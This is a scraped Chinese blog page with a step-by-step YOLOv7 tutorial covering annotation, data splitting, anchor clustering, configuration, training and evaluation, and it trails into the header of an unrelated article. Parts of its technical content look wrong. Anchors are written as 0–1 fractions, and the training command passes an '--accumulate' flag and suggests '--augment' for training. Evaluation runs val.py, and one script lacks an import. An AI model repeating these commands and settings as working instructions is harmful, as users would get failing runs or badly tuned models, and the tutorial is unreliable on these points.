0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>YOLO系列模型凭借高效的实时检测能力，成为工业级目标检测任务的首选框架。但对新手而言，从原始数据到可用模型的全流程充满“隐形坑”——标注格式出错、训练不收敛、评估指标看不懂等问题，往往让人半途而废。</p>
<p>本文以YOLOv7为例，完整拆解“数据集标注→数据预处理→网络配置→模型训练→模型评估→部署准备”全工作流，每个环节均提供可直接复用的实操代码与避坑要点，最后附上全流程避坑清单，帮新手快速打通从数据到模型的“任督二脉”。</p>
<h2 data-id="heading-0">一、数据集标注：新手入门必会的工具与规范</h2>
<p>高质量标注是模型训练的基础，新手常因标注工具选错、格式不规范，导致后续训练全流程出错。本节聚焦“工具选型+标注规范+格式校验”，帮你高效完成标注工作。</p>
<h3 data-id="heading-1">1.1 标注工具选型：新手首选LabelImg</h3>
<p>推荐新手使用LabelImg（轻量、开源、支持YOLO格式），安装与使用步骤如下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 安装（Python3环境）</span>
pip install labelImg

<span class="hljs-comment"># 2. 启动工具</span>
labelImg  <span class="hljs-comment"># 终端输入命令，打开可视化界面</span>

<span class="hljs-comment"># 3. 核心设置（关键！避免后续格式转换）</span>
<span class="hljs-comment"># 点击菜单栏“View”，勾选以下选项：</span>
<span class="hljs-comment"># - Auto Save mode（自动保存）</span>
<span class="hljs-comment"># - Display Labels（显示标注框）</span>
<span class="hljs-comment"># - Advanced Mode（高级模式，显示坐标）</span>
<span class="hljs-comment"># 点击“Format”，选择“YOLO”（直接生成YOLO所需txt格式）</span>
</code></pre>
<h3 data-id="heading-2">1.2 标注规范：避免后续训练“踩大坑”</h3>
<p>YOLO模型对标注格式要求严格，需遵循以下规范：</p>
<ul>
<li><strong>格式要求</strong>：每个图像对应一个txt文件，每行标注一个目标，格式为“class x_center y_center width height”（坐标需归一化到0~1范围，即除以图像宽高）；</li>
<li><strong>类别命名</strong>：类别名称统一（如“car”“person”），类别编号从0开始连续编号（禁止跳过0直接从1开始）；</li>
<li><strong>标注精度</strong>：标注框需完全包围目标，避免漏框、多框、框选过多背景（小目标建议放大后标注）；</li>
<li><strong>文件匹配</strong>：txt文件名与对应图像文件名完全一致（如“img_001.jpg”对应“img_001.txt”），且放在指定标签目录。</li>
</ul>
<h3 data-id="heading-3">1.3 标注格式校验：提前规避训练隐患</h3>
<p>标注完成后，务必用以下代码批量校验格式（保存为check_annotation.py），避免因个别错误导致全流程卡壳：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> glob

<span class="hljs-comment"># 配置数据集路径</span>
label_dir = <span class="hljs-string">"data/custom/labels/train"</span>  <span class="hljs-comment"># 训练集标签路径</span>
img_dir = <span class="hljs-string">"data/custom/images/train"</span>    <span class="hljs-comment"># 训练集图像路径</span>
nc = <span class="hljs-number">2</span>  <span class="hljs-comment"># 自定义数据集类别数（根据实际修改）</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_annotation</span>():
    <span class="hljs-comment"># 1. 检查标签文件与图像文件是否匹配</span>
    img_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(img_dir) <span class="hljs-keyword">if</span> f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))])
    label_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(label_dir) <span class="hljs-keyword">if</span> f.endswith(<span class="hljs-string">'.txt'</span>)])
    mismatch = img_files - label_files
    <span class="hljs-keyword">if</span> mismatch:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"警告：以下图像无对应标签文件：<span class="hljs-subst">{mismatch}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-comment"># 2. 检查标注格式是否正确</span>
    label_paths = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> label_paths:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
            lines = f.readlines()
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                parts = line.strip().split()
                <span class="hljs-comment"># 检查每行是否有5个元素（class x y w h）</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">5</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中某行标注格式错误，应为'class x y w h'"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查类别编号是否合法</span>
                class_id = <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>])
                <span class="hljs-keyword">if</span> class_id &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> class_id &gt;= nc:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中类别编号<span class="hljs-subst">{class_id}</span>超出范围（0~<span class="hljs-subst">{nc-<span class="hljs-number">1</span>}</span>）"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查坐标是否归一化（0~1）</span>
                coords = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">float</span>, parts[<span class="hljs-number">1</span>:]))
                <span class="hljs-keyword">for</span> coord <span class="hljs-keyword">in</span> coords:
                    <span class="hljs-keyword">if</span> coord &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> coord &gt; <span class="hljs-number">1</span>:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中坐标<span class="hljs-subst">{coord}</span>未归一化（应在0~1之间）"</span>)
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"标注格式检查通过！"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    check_annotation()
</code></pre>
<h2 data-id="heading-4">二、数据预处理：为训练收敛打基础</h2>
<p>原始标注数据需经过“数据集划分→数据增强→锚框聚类”预处理，才能适配YOLO模型训练。本节步骤直接决定后续模型是否能快速收敛。</p>
<h3 data-id="heading-5">2.1 数据集划分：8:2比例科学拆分</h3>
<p>按“训练集:验证集=8:2”划分，确保两者分布一致（如同一类目标在两组中均有分布），避免因分布差异导致模型泛化能力差。使用以下代码快速划分：</p>
<pre><code class="hljs language-ini" lang="ini">import os
import random
import shutil

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">src_img_dir</span> = <span class="hljs-string">"data/custom/all_images"</span>  <span class="hljs-comment"># 原始图像目录</span>
<span class="hljs-attr">src_label_dir</span> = <span class="hljs-string">"data/custom/all_labels"</span>  <span class="hljs-comment"># 原始标签目录</span>
<span class="hljs-attr">dst_train_img_dir</span> = <span class="hljs-string">"data/custom/images/train"</span>  <span class="hljs-comment"># 训练集图像目录</span>
<span class="hljs-attr">dst_train_label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>  <span class="hljs-comment"># 训练集标签目录</span>
<span class="hljs-attr">dst_val_img_dir</span> = <span class="hljs-string">"data/custom/images/val"</span>  <span class="hljs-comment"># 验证集图像目录</span>
<span class="hljs-attr">dst_val_label_dir</span> = <span class="hljs-string">"data/custom/labels/val"</span>  <span class="hljs-comment"># 验证集标签目录</span>
<span class="hljs-attr">val_ratio</span> = <span class="hljs-number">0.2</span>  <span class="hljs-comment"># 验证集比例</span>

<span class="hljs-comment"># 创建目标文件夹（若不存在）</span>
os.makedirs(dst_train_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_train_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 随机划分数据</span>
<span class="hljs-attr">img_files</span> = [f for f in os.listdir(src_img_dir) if f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))]
random.shuffle(img_files)  <span class="hljs-comment"># 打乱顺序，保证随机性</span>
<span class="hljs-attr">val_num</span> = int(len(img_files) * val_ratio)
<span class="hljs-attr">val_files</span> = img_files[:val_num]
<span class="hljs-attr">train_files</span> = img_files[val_num:]

<span class="hljs-comment"># 复制训练集数据</span>
for f in train_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_train_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_train_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

<span class="hljs-comment"># 复制验证集数据</span>
for f in val_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_val_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_val_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

print(f"划分完成：训练集{len(train_files)}张，验证集{len(val_files)}张")
</code></pre>
<h3 data-id="heading-6">2.2 数据增强：提升模型泛化能力</h3>
<p>新手无需自定义增强逻辑，直接使用YOLOv7原生支持的增强策略，在训练命令中启用即可，避免过度增强破坏目标：</p>
<ul>
<li><strong>基础增强（必选）</strong> ：随机翻转（flip）、随机裁剪（crop）、色域变换（hsv_h、hsv_s、hsv_v），YOLOv7默认启用，无需额外配置；</li>
<li><strong>新手避坑</strong>：不建议开启极端增强（如random_perspective的degrees设置＞30），避免目标被裁剪或变形，导致模型学不到有效特征；</li>
<li><strong>小数据集增强</strong>：若数据集＜500张，可添加“--augment”参数启用额外增强（如Mosaic增强），提升数据多样性。</li>
</ul>
<h3 data-id="heading-7">2.3 锚框聚类：适配自定义目标尺寸</h3>
<p>YOLO模型的默认锚框是为COCO数据集设计的，若自定义数据集目标尺寸差异较大，需重新聚类锚框，否则会导致训练收敛慢、精度低。使用以下代码聚类：</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import glob
from sklearn.cluster import KMeans

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>
<span class="hljs-attr">num_anchors</span> = <span class="hljs-number">9</span>  <span class="hljs-comment"># YOLOv7需要9个锚框（3层×3个）</span>

def load_target_sizes(label_dir):
    <span class="hljs-attr">target_sizes</span> = []
    <span class="hljs-attr">label_paths</span> = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    for path in label_paths:
        with open(path, 'r') as f:
            <span class="hljs-attr">lines</span> = f.readlines()
            for line in lines:
                <span class="hljs-attr">parts</span> = line.strip().split()
                <span class="hljs-attr">w</span> = float(parts[<span class="hljs-number">3</span>])
                <span class="hljs-attr">h</span> = float(parts[<span class="hljs-number">4</span>])
                target_sizes.append(<span class="hljs-section">[w, h]</span>)
    return np.array(target_sizes)

def cluster_anchors(target_sizes, num_anchors):
    <span class="hljs-attr">kmeans</span> = KMeans(n_clusters=num_anchors, random_state=<span class="hljs-number">0</span>).fit(target_sizes)
    <span class="hljs-attr">anchors</span> = kmeans.cluster_centers_
    <span class="hljs-comment"># 按面积排序，分成3组（对应3个检测层）</span>
    <span class="hljs-attr">anchors</span> = sorted(anchors, key=lambda x: x[<span class="hljs-number">0</span>]*x[<span class="hljs-number">1</span>])
    <span class="hljs-attr">anchors</span> = np.array(anchors).reshape(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)
    return anchors

if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">target_sizes</span> = load_target_sizes(label_dir)
    <span class="hljs-attr">anchors</span> = cluster_anchors(target_sizes, num_anchors)
    print("聚类得到的锚框（按检测层分组）：")
    print(anchors)
    <span class="hljs-comment"># 示例输出（需替换到网络配置文件中）：</span>
    <span class="hljs-comment"># [[[0.05, 0.08], [0.09, 0.12], [0.13, 0.18]],</span>
    <span class="hljs-comment">#  [[0.20, 0.25], [0.28, 0.35], [0.40, 0.45]],</span>
    <span class="hljs-comment">#  [[0.50, 0.60], [0.70, 0.80], [0.90, 1.00]]]</span>
</code></pre>
<h2 data-id="heading-8">三、网络配置与超参数：新手不踩坑的核心设置</h2>
<p>网络配置和超参数错误是训练不收敛的主要原因之一。本节聚焦“网络配置修改→超参数适配”，提供新手友好的配置方案。</p>
<h3 data-id="heading-9">3.1 网络配置文件修改</h3>
<p>复制YOLOv7官方配置文件“cfg/training/yolov7.yaml”，重命名为“yolov7-custom.yaml”，按以下步骤修改：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># parameters</span>
<span class="hljs-attr">nc:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># 改为自定义数据集的类别数（核心！）</span>
<span class="hljs-attr">depth_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># 模型深度系数（新手保持默认）</span>
<span class="hljs-attr">width_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># 通道宽度系数（新手保持默认）</span>

<span class="hljs-comment"># anchors：替换为2.3节聚类得到的锚框</span>
<span class="hljs-attr">anchors:</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">0.05</span>, <span class="hljs-number">0.08</span>, <span class="hljs-number">0.09</span>, <span class="hljs-number">0.12</span>, <span class="hljs-number">0.13</span>, <span class="hljs-number">0.18</span>]  <span class="hljs-comment"># P3/8（对应小目标）</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">0.20</span>, <span class="hljs-number">0.25</span>, <span class="hljs-number">0.28</span>, <span class="hljs-number">0.35</span>, <span class="hljs-number">0.40</span>, <span class="hljs-number">0.45</span>]  <span class="hljs-comment"># P4/16（对应中目标）</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">0.50</span>, <span class="hljs-number">0.60</span>, <span class="hljs-number">0.70</span>, <span class="hljs-number">0.80</span>, <span class="hljs-number">0.90</span>, <span class="hljs-number">1.00</span>]  <span class="hljs-comment"># P5/32（对应大目标）</span>

<span class="hljs-comment"># 其他配置保持默认（新手无需修改）</span>
</code></pre>
<h3 data-id="heading-10">3.2 数据集配置文件创建</h3>
<p>在“data/custom/”目录下创建“data.yaml”文件，指定数据集路径和类别信息：</p>
<pre><code class="hljs language-bash" lang="bash">train: ../custom/images/train  <span class="hljs-comment"># 训练集图像路径（相对YOLOv7源码根目录）</span>
val: ../custom/images/val      <span class="hljs-comment"># 验证集图像路径</span>
nc: 2                          <span class="hljs-comment"># 类别数（与网络配置文件一致）</span>
names: [<span class="hljs-string">'car'</span>, <span class="hljs-string">'person'</span>]       <span class="hljs-comment"># 类别名称（按编号0、1顺序排列）</span>
</code></pre>
<h3 data-id="heading-11">3.3 超参数适配：按GPU显存调整</h3>
<p>YOLOv7官方超参数基于batch_size=64设计，新手需按自己的GPU显存调整，核心遵循“batch_size减半，学习率减半”原则：</p>
<ul>
<li>
<p><strong>学习率配置</strong>：修改“data/hyp.scratch.yaml”中的“lr0”参数：</p>
<ul>
<li>单卡24G显存（batch_size=64）：lr0=0.01（默认）；</li>
<li>单卡16G显存（batch_size=32）：lr0=0.005；</li>
<li>单卡8G显存（batch_size=16）：lr0=0.0025；</li>
<li>单卡4G显存（batch_size=8）：lr0=0.00125。</li>
</ul>
</li>
<li>
<p><strong>梯度累积</strong>：若显存不足，添加“--accumulate n”参数等价增大batch_size（如batch_size=8，accumulate=2等价于16）；</p>
</li>
<li>
<p><strong>新手避坑</strong>：不要使用过小的学习率（如＜0.0001），会导致Loss下降极慢；也不要使用过大的学习率（如＞0.01），会导致Loss震荡不收敛。</p>
</li>
</ul>
<h2 data-id="heading-12">四、模型训练与监控：实时掌握训练状态</h2>
<p>完成以上配置后，执行训练命令并实时监控，及时发现训练异常（如不收敛、过拟合）。</p>
<h3 data-id="heading-13">4.1 训练命令（新手推荐）</h3>
<pre><code class="hljs language-css" lang="css"># 单卡训练（适配<span class="hljs-number">8</span>G显存，batch_size=<span class="hljs-number">16</span>，accumulate=<span class="hljs-number">2</span>等价于<span class="hljs-number">32</span>）
python train<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--weights</span> yolov7<span class="hljs-selector-class">.pt</span> <span class="hljs-attr">--cfg</span> cfg/training/yolov7-custom<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--data</span> data/custom/data<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--epochs</span> <span class="hljs-number">100</span> <span class="hljs-attr">--batch-size</span> <span class="hljs-number">16</span> <span class="hljs-attr">--accumulate</span> <span class="hljs-number">2</span> <span class="hljs-attr">--device</span> <span class="hljs-number">0</span> <span class="hljs-attr">--name</span> yolov7_custom_train <span class="hljs-attr">--cache</span>

# 参数说明：
# <span class="hljs-attr">--weights</span> yolov7<span class="hljs-selector-class">.pt</span>：加载官方预训练权重（核心！避免从头训练）
# <span class="hljs-attr">--cfg</span>：自定义网络配置文件路径
# <span class="hljs-attr">--data</span>：数据集配置文件路径
# <span class="hljs-attr">--epochs</span> <span class="hljs-number">100</span>：训练轮数（新手足够观察收敛趋势）
# <span class="hljs-attr">--device</span> <span class="hljs-number">0</span>：使用第<span class="hljs-number">0</span>块GPU
# <span class="hljs-attr">--name</span>：训练日志保存名称
# <span class="hljs-attr">--cache</span>：缓存数据到内存，加速训练
</code></pre>
<h3 data-id="heading-14">4.2 训练过程监控：3个关键指标</h3>
<p>训练时实时观察以下指标，判断训练是否正常：</p>
<ol>
<li><strong>Loss曲线</strong>：前10个epoch，train_loss应快速下降（如从10+降到2以下）；50epoch后趋于平稳，val_loss与train_loss差距≤0.5（差距过大则过拟合）；</li>
<li><strong>精度指标</strong>：30epoch后，mAP50、mAP50-95应逐步上升，最终稳定在一个区间（无“精度为0”或断崖式下降）；</li>
<li><strong>可视化监控</strong>：启用TensorBoard查看曲线： <code>tensorboard --logdir runs/train/yolov7_custom_train</code></li>
</ol>
<h3 data-id="heading-15">4.3 中断训练恢复</h3>
<p>若训练中断，通过以下命令恢复训练（无需从头开始）：</p>
<pre><code class="hljs language-bash" lang="bash">python train.py --resume runs/train/yolov7_custom_train/weights/last.pt
</code></pre>
<h2 data-id="heading-16">五、模型评估：从指标到可视化，全面验证模型性能</h2>
<p>训练完成后，需通过“量化指标+可视化结果”全面评估模型性能，判断是否满足实际需求。</p>
<h3 data-id="heading-17">5.1 核心评估指标解读</h3>
<p>YOLOv7训练完成后，会自动生成评估报告，核心指标解读如下：</p>
<ul>
<li><strong>mAP50</strong>：IOU阈值为0.5时的平均精度（核心指标），越高说明模型检测准确率越高（工业场景一般要求≥0.7）；</li>
<li><strong>mAP50-95</strong>：IOU阈值从0.5到0.95的平均精度，更全面反映模型性能；</li>
<li><strong>P（Precision）</strong> ：精确率（预测为正的样本中实际为正的比例），越高说明误检越少；</li>
<li><strong>R（Recall）</strong> ：召回率（实际为正的样本中被预测为正的比例），越高说明漏检越少；</li>
<li><strong>F1-score</strong>：P和R的调和平均，综合反映模型精确率和召回率。</li>
</ul>
<h3 data-id="heading-18">5.2 手动评估与结果可视化</h3>
<p>使用以下命令手动生成详细评估报告，并可视化预测结果：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 生成详细评估报告（包含各类别指标）</span>
python val.py --weights runs/train/yolov7_custom_train/weights/best.pt --data data/custom/data.yaml --task val --device 0

<span class="hljs-comment"># 2. 可视化预测结果（保存到runs/detect目录）</span>
python detect.py --weights runs/train/yolov7_custom_train/weights/best.pt --<span class="hljs-built_in">source</span> data/custom/images/val --save-txt --save-conf

<span class="hljs-comment"># 参数说明：</span>
<span class="hljs-comment"># --source：待检测图像/视频路径（可填文件夹、单张图像、视频文件）</span>
<span class="hljs-comment"># --save-txt：保存预测框坐标（txt格式）</span>
<span class="hljs-comment"># --save-conf：保存预测置信度</span>
</code></pre>
<h3 data-id="heading-19">5.3 模型优化：针对弱指标调整</h3>
<p>若评估指标不达标，按以下方向优化：</p>
<ul>
<li><strong>小目标漏检（小目标AP低）</strong> ：增大输入图像尺寸（--img 800）、优化小目标锚框、增加小目标样本；</li>
<li><strong>误检多（Precision低）</strong> ：提高预测置信度阈值（detect.py中--conf 0.5）、增加难例样本训练；</li>
<li><strong>过拟合（train_loss低，val_loss高）</strong> ：减少数据增强强度、增加正则化（修改hyp.scratch.yaml中的weight_decay）、增加训练数据量。</li>
</ul>
<h2 data-id="heading-20">六、全流程避坑清单：新手快速排错指南</h2>
<p>总结全工作流15个高频坑，按“标注→预处理→训练→评估”分类，遇到问题时可直接对照排查：</p>
<h3 data-id="heading-21">6.1 标注阶段避坑</h3>
<ol>
<li>标注格式未选YOLO，导致坐标非归一化→ 标注前确认LabelImg格式为“YOLO”；</li>
<li>类别编号从1开始（非0）→ 统一从0开始连续编号；</li>
<li>txt文件名与图像文件名不匹配→ 用1.3节代码校验；</li>
<li>标注框未完全包围目标→ 放大图像精细标注。</li>
</ol>
<h3 data-id="heading-22">6.2 预处理阶段避坑</h3>
<ol>
<li>训练集与验证集分布差异大→ 确保两组数据包含相同场景、相同尺度目标；</li>
<li>未聚类锚框，直接使用默认值→ 自定义数据集必须重新聚类锚框；</li>
<li>数据增强过度，目标被破坏→ 关闭极端增强，使用默认增强参数。</li>
</ol>
<h3 data-id="heading-23">6.3 训练阶段避坑</h3>
<ol>
<li>未使用预训练权重，从头训练→ 必须加载官方yolov7.pt；</li>
<li>网络配置文件nc与实际类别数不一致→ 确保nc等于自定义类别数；</li>
<li>学习率与batch_size不匹配→ 按3.3节适配学习率；</li>
<li>GPU显存不足导致训练中断→ 减小batch_size，启用梯度累积；</li>
<li>训练Loss始终＞5→ 检查标注格式、网络配置、学习率。</li>
</ol>
<h3 data-id="heading-24">6.4 评估阶段避坑</h3>
<ol>
<li>评估时使用错误的数据集→ 确保val.py中--data指向正确的data.yaml；</li>
<li>误将训练集当作验证集评估→ 严格区分train/val目录；</li>
<li>可视化结果无预测框→ 检查模型权重路径、置信度阈值（--conf）。</li>
</ol>
<h2 data-id="heading-25">七、总结：从数据到模型的闭环逻辑</h2>
<p>YOLO目标检测的完整工作流核心是“数据→配置→训练→评估→优化”的闭环：高质量标注是基础，科学预处理是前提，合理配置是关键，实时监控是保障，精准评估与优化是提升模型性能的核心。</p>
<p>新手无需追求复杂的自定义修改，先按本文流程打通全链路，再针对具体问题（如小目标检测、复杂场景适配）逐步优化。按此流程操作，可快速从新手成长为能独立完成YOLO目标检测项目的工程师。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1 个人用AI编程开发的产品卖了8000万美金——Base44的增长策略全拆解]]></title>    <link>https://juejin.cn/post/7572459757107920950</link>    <guid>https://juejin.cn/post/7572459757107920950</guid>    <pubDate>2025-11-16T03:20:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7572459757107920950" data-draft-id="7572459757107904566" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1 个人用AI编程开发的产品卖了8000万美金——Base44的增长策略全拆解"/> <meta itemprop="keywords" content="AI编程,人工智能"/> <meta itemprop="datePublished" content="2025-11-16T03:20:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="饼干哥哥"/> <meta itemprop="url" content="https://juejin.cn/user/2001569972490973"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1 个人用AI编程开发的产品卖了8000万美金——Base44的增长策略全拆解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2001569972490973/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    饼干哥哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-16T03:20:59.000Z" title="Sun Nov 16 2025 03:20:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    134
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 